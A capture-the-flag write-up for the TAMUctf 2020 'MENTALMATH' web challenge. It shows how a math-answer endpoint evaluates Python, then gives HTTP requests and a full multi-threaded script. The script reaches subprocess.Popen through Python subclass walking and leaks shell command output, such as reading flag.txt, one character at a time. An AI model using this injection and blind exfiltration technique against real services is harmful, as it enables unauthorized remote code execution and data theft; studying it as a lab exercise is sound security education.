# TAMUctf 2020 – MENTALMATH

* **Category:** web
* **Points:** 262

## Challenge

> My first web app, check it out!
> 
> http://mentalmath.tamuctf.com

## Solution

**DISCLAIMER**: This is *not the best solution* for the challenge, but hey: I had fun in scripting and exfiltrating stuff. Anyway, this could be useful for SSTI vulnerabilties.

Analyzing the web page source an interesting comment can be found.

```html
<!doctype html>

<html lang="en">
  <head>
    <meta charset="utf-8">

    <title>mEnTaL MaTh</title>
    <meta name="description" content="A game for the wise.">
    <meta name="author" content="Arithmetic King">

    <!--% block css %}{% endblock %-->

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
  </head>

  <body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script> 
    <div class="container">
      

<div class="row mt-5">
  <div class="col-sm-12 text-center"> <h1 id="problem"></h1> </div>
  <div class="col-sm-12 text-center"> <input name="answer" type="text" style="font-size: 24px; width: 150px;" id="answer"> </div>
</div>

<div class="row mt-2">
  <div class="col-sm-12 text-center"><p>Sharpen your mind!</p></div>
</div>

<div class="row mt-1">
  <div class="col-sm-12 text-center"><a href="/">Go back</a></div>
</div>

<script>
  function submitProblem() {
    $.post("/ajax/new_problem", {'problem': $("#problem").html(), 'answer': $('#answer').val()}, function ( data ) {
      if (data.correct) {
        $('#problem').html(data.problem);
        $('#answer').val('');
      }
    });
  }

$(document).ready(function() {
  $("#answer").on('input', submitProblem);
  submitProblem();
});
</script>


    </div>
  </body>
</html>
```

That comment (wrongly) suggested me that the vulnerability could have been related to a SSTI with *Jinja2* template engine (i.e. Python backend).

The remote endpoint allows you to submit a math `problem` and its `answer`.

```
POST /ajax/new_problem HTTP/1.1
Host: mentalmath.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 41
Origin: http://mentalmath.tamuctf.com
Connection: close
Referer: http://mentalmath.tamuctf.com/play/

problem=max%281%2C%203%2C%202%29&answer=3

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 21:59:43 GMT
Content-Type: application/json
Content-Length: 39
Connection: close
X-Frame-Options: SAMEORIGIN

{"correct": true, "problem": "37 - 83"}
```

I don't know why, but I didn't think that it was a generic RCE via Python, even when I discovered that I could inject and execute `ord()` function (duh).

```
POST /ajax/new_problem HTTP/1.1
Host: mentalmath.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 34
Origin: http://mentalmath.tamuctf.com
Connection: close
Referer: http://mentalmath.tamuctf.com/play/

problem=ord%28%27a%27%29&answer=97

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 00:19:55 GMT
Content-Type: application/json
Content-Length: 39
Connection: close
X-Frame-Options: SAMEORIGIN

{"correct": true, "problem": "20 - 58"}
```

So at this point I started a (stupid) "blind" approach, similar to the ones you normally use in SSTI vulnerabilities:
1. enumerate `mro_index` and `subclasses_index` into `''.__class__.mro()[mro_index].__subclasses__()[subclasses_index]` structure in order to find where `subprocess.Popen` class is located, using `ord(list(str())[char_index])` functions to exfiltrate one char at a time; `subprocess.Popen` was at `''.__class__.mro()[1].__subclasses__()[208]`;
2. enumerate server directories launching `ls` commands via `''.__class__.mro()[1].__subclasses__()[208]('command_to_launch',shell=True,stdout=-1).communicate()[0].strip()` in order to find the flag file; results are read one char at a time with `ord(list(str())[char_index])` functions;
3. print the flag reading one char at a time with the `cat /code/flag.txt` command.

I scripted everything in a [multi-threaded Python script](mentalmath-solver.py).

```python
#!/usr/bin/python

import requests
import string
import time
import _thread

debug = True

target_url = "http://mentalmath.tamuctf.com/ajax/new_problem"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
   "X-Requested-With": "XMLHttpRequest",
   "Accept-Encoding": "gzip, deflate, br",
   "Origin": "http://mentalmath.tamuctf.com",
   "Referer": "http://mentalmath.tamuctf.com/play/",
}


def log_debug(scope, message):
    if debug:
        print("   DEBUG ({}) | {}".format(scope, message))


def check_python_class(searched_class, mro_index, subclass_index):
    #log_debug(searched_class, "search python class > {} in mro={}, subclass={}".format(searched_class, mro_index, subclass_index))
    
    output = ""
    found_chars = 0
    char_index = 8
    for c in searched_class:
        data = {"problem": "ord(list(str(''.__class__.mro()[{}].__subclasses__()[{}]))[{}])".format(mro_index, subclass_index, char_index), "answer": "{}".format(ord(c))}
        #log_debug(searched_class, data)
        
        response = None
        response_ok = False
        while not response_ok:
            try:
                r = requests.post(target_url, headers=headers, data=data)
                response = r.text
                #log_debug(searched_class, response)
                if r.status_code != 502:
                    response_ok = True
                else:
                    time.sleep(10)
            except:
                print("   EXCEPTION!")
                time.sleep(5 * 60)
        
        if "\"correct\": true" in response:
            output += c
            #log_debug(searched_class, output)
            found_chars += 1
            char_index += 1
        elif "\"correct\": false" in response or "Server Error" in response:
            break
        time.sleep(0.5)
    
    if found_chars == len(searched_class):
        print("search python class > {} @ ''.__class__.mro()[{}].__subclasses__()[{}]".format(searched_class, mro_index, subclass_index))


def search_python_class_t(searched_class, mro_index):
    for subclass_index in range(0, 672):
        check_python_class(searched_class, mro_index, subclass_index)


def search_python_class(searched_class):
    print("search python class > {}".format(searched_class))
    for mro_index in range(0, 3):        
        _thread.start_new_thread(search_python_class_t, (searched_class, mro_index,))


def launch_remote_stuff(command_skeleton, command):
    output = ""
    print("remote command > {}".format(command))
    
    finished = False
    index = 0
    while not finished:
        
        for c in string.printable:
            data = {"problem": command_skeleton.format(command, index), "answer": "{}".format(ord(c))}
            #log_debug(command, data)
            
            response = None
            response_ok = False
            while not response_ok:
                try:
                    r = requests.post(target_url, headers=headers, data=data)
                    response = r.text
                    #log_debug(command, response)
                    if r.status_code != 502:
                        response_ok = True
                    else:
                        time.sleep(10)
                except:
                    print("   EXCEPTION!")
                    time.sleep(5 * 60)
            
            if "\"correct\": true" in response:
                output += c
                log_debug(command, output)
                index += 1
                break
            elif "Server Error" in response:
                finished = True
                break
            time.sleep(0.5)
    
    print("[{}] > {}".format(command, output))


def launch_remote_python_command(python_command):
    launch_remote_stuff("ord(list(str({}))[{}])", python_command)


def launch_remote_shell_command(shell_command):
    launch_remote_stuff("ord(list(str(''.__class__.mro()[1].__subclasses__()[208]('{}',shell=True,stdout=-1).communicate()[0].strip()))[{}])", shell_command)


# Exploitation.

#search_python_class("subprocess.Popen") # subprocess.Popen @ ''.__class__.mro()[1].__subclasses__()[208]

#while True:
#    pass

#commands = ["ls /", "ls .", "ls /etc", "ls /code", "ls /dev"]
#for command in commands:
#    _thread.start_new_thread(launch_remote_shell_command, (command,))

#while True:
#    pass

launch_remote_shell_command("cat /code/flag.txt")
```

The flag is the following.

```
gigem{1_4m_g0od_47_m4tH3m4aatics_n07_s3cUr1ty_h3h3h3he}
```